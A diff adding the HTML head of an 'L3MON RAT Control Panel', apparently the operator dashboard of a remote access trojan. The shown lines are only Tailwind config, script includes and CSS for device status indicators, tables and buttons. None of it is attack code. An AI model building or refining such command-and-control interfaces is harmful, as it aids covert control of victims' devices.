@@ -1,0 +1,74 @@
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>L3MON RAT Control Panel</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        bg: { dark: '#0f1923', card: '#151d2b', sidebar: '#0c1421', hover: '#1e293b' },
+                        accent: { blue: '#3b82f6', cyan: '#06b6d4', green: '#10b981', red: '#ef4444', amber: '#f59e0b', purple: '#8b5cf6' }
+                    }
+                }
+            }
+        }
+    </script>
+    <link rel="stylesheet" href="/css/snackbar.min.css" />
+    <script src="/js/jquery-3.4.1.min.js"></script>
+    <script src="/js/snackbar.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script>
+        function gtag() { }
+        function showNotification(color, text) {
+            if (typeof Snackbar !== 'undefined') Snackbar.show({ text, backgroundColor: color, duration: 4000 });
+            else alert(text);
+        }
+    </script>
+    <style>
+        /* Base dark theme */
+        body { background: #0f1923; color: #cbd5e1; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: #151d2b; }
+        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: #475569; }
+        /* Card glass effect */
+        .glass { background: rgba(21,29,43,0.8); border: 1px solid rgba(59,130,246,0.15); backdrop-filter: blur(10px); }
+        .glass-bright { background: rgba(30,41,59,0.9); border: 1px solid rgba(59,130,246,0.2); }
+        /* Gradient cards */
+        .gradient-blue { background: linear-gradient(135deg, #1e3a5f 0%, #0f2847 100%); }
+        .gradient-green { background: linear-gradient(135deg, #134e4a 0%, #0c3547 100%); }
+        .gradient-amber { background: linear-gradient(135deg, #78350f 0%, #451a03 100%); }
+        /* Glow effects */
+        .glow-green { box-shadow: 0 0 15px rgba(16,185,129,0.3); }
+        .glow-blue { box-shadow: 0 0 15px rgba(59,130,246,0.3); }
+        .glow-amber { box-shadow: 0 0 15px rgba(245,158,11,0.3); }
+        /* Online indicator */
+        .status-online { width: 8px; height: 8px; background: #10b981; border-radius: 50%; display: inline-block; box-shadow: 0 0 8px #10b981; animation: pulse-green 2s infinite; }
+        .status-offline { width: 8px; height: 8px; background: #64748b; border-radius: 50%; display: inline-block; }
+        @keyframes pulse-green { 0%,100% { opacity: 1; } 50% { opacity: 0.5; } }
+        /* Table rows */
+        .table-row { transition: background-color 0.15s; }
+        .table-row:hover { background: rgba(59,130,246,0.08); }
+        /* Activity feed dot */
+        .feed-dot { width: 10px; height: 10px; border-radius: 50%; flex-shrink: 0; margin-top: 6px; }
+        /* Toast */
+        .toast-item { animation: slideIn 0.3s ease; }
+        @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+        /* Input styles */
+        input, select, textarea { background: #1e293b !important; border: 1px solid #334155 !important; color: #e2e8f0 !important; border-radius: 6px !important; }
+        input:focus, select:focus, textarea:focus { border-color: #3b82f6 !important; outline: none !important; }
+        /* Button styles */
+        .btn-primary { background: #3b82f6; color: #fff; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; transition: all 0.2s; }
+        .btn-primary:hover { background: #2563eb; }
+        .btn-danger { background: #ef4444; color: #fff; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; }
+        .btn-danger:hover { background: #dc2626; }
+        .btn-success { background: #10b981; color: #fff; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; }
+        .btn-success:hover { background: #059669; }
+        .btn-ghost { background: transparent; color: #94a3b8; border: 1px solid #334155; padding: 8px 16px; border-radius: 6px; cursor: pointer; transition: all 0.2s; }
+        .btn-ghost:hover { background: #1e293b; color: #e2e8f0; border-color: #475569; }
+    </style>
+</head>
